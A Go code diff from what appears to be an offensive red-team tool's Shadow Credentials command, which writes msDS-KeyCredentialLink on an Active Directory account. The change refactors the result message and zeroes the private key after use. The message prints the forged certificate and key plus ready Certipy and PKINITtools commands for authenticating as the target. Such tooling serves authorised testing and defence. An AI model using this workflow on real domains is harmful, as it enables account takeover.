@@ -246,24 +246,27 @@ func ldapShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 	structs.ZeroBytes(keyDER)
 	structs.ZeroBytes(credential)
 
+	output := fmt.Sprintf("[*] Shadow Credentials — msDS-KeyCredentialLink (T1556.006)\n"+
+		"[+] Target:    %s\n"+
+		"[+] DeviceID:  %s\n"+
+		"[+] KeySize:   RSA-2048\n"+
+		"[+] Server:    %s\n"+
+		"[+] Status:    KEY_CREDENTIAL written successfully\n"+
+		"\n--- Certificate (PEM) ---\n%s"+
+		"\n--- Private Key (PEM) ---\n%s"+
+		"\n[!] Usage with PKINITtools:\n"+
+		"    python3 gettgtpkinit.py %s/%s -cert-pem cert.pem -key-pem key.pem out.ccache\n"+
+		"\n[!] Usage with Certipy:\n"+
+		"    certipy auth -pfx shadow.pfx -username %s -domain %s\n"+
+		"\n[!] Cleanup: ldap-write -action clear-shadow-cred -server %s -target %s\n",
+		targetDN, formatGUID(deviceID), args.Server,
+		string(certPEM), string(keyPEM),
+		extractDomain(targetDN), args.Target, args.Target, extractDomain(targetDN),
+		args.Server, args.Target)
+	structs.ZeroBytes(keyPEM)
+
 	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] Shadow Credentials — msDS-KeyCredentialLink (T1556.006)\n"+
-			"[+] Target:    %s\n"+
-			"[+] DeviceID:  %s\n"+
-			"[+] KeySize:   RSA-2048\n"+
-			"[+] Server:    %s\n"+
-			"[+] Status:    KEY_CREDENTIAL written successfully\n"+
-			"\n--- Certificate (PEM) ---\n%s"+
-			"\n--- Private Key (PEM) ---\n%s"+
-			"\n[!] Usage with PKINITtools:\n"+
-			"    python3 gettgtpkinit.py %s/%s -cert-pem cert.pem -key-pem key.pem out.ccache\n"+
-			"\n[!] Usage with Certipy:\n"+
-			"    certipy auth -pfx shadow.pfx -username %s -domain %s\n"+
-			"\n[!] Cleanup: ldap-write -action clear-shadow-cred -server %s -target %s\n",
-			targetDN, formatGUID(deviceID), args.Server,
-			string(certPEM), string(keyPEM),
-			extractDomain(targetDN), args.Target, args.Target, extractDomain(targetDN),
-			args.Server, args.Target),
+		Output:    output,
 		Status:    "success",
 		Completed: true,
 	}
